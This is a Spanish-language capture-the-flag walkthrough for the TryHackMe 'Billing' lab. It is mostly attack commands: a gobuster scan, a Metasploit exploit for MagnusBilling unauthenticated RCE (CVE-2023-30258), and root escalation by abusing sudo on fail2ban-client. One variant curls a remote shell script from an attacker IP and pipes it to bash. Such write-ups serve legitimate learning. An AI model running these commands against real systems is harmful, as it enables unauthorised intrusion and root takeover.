# Billing - TryHackMe

**IP:** 10.10.119.166

## Descubrimiento
```bash
gobuster dir -u http://10.10.119.166 -w /usr/share/wordlists/dirb/common.txt
```

## Exploit
- CVE-2023-30258 (MagnusBilling unauthenticated RCE):
```bash
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set RHOSTS 10.10.56.227
set LHOST 10.9.0.107
exploit
```

## Post-Explotación
```bash
sudo -l
```

## Escalada de Privilegios
```bash
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'cat /root/root.txt > /tmp/root.txt && chmod 666 /tmp/root.txt'"
# O bien:
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'curl http://10.6.15.252:9000/shell.sh | bash'"
```
